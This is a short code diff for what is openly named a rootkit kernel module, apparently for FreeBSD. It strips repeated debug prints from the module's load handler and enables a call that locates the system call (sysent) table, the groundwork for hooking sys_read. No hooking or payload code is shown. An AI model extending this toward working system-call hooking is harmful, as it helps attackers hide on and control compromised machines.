@@ -147,26 +147,10 @@ static int rootkit_handler(struct module *module, int event, void *arg) {
     int search_table_case = 0;
     switch (event) {
     case MOD_LOAD:
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        uprintf("module loaded");
-        //search_table_case = find_sysread_address();
+        // the module is successfully loaded till here
+        // that means that whatever compilation issues or breaks happen, are after line 151
+
+        search_table_case = find_sysread_address();
         if (search_table_case == 0) {
             uprintf("No error with finding sysent table address.\n");
         }
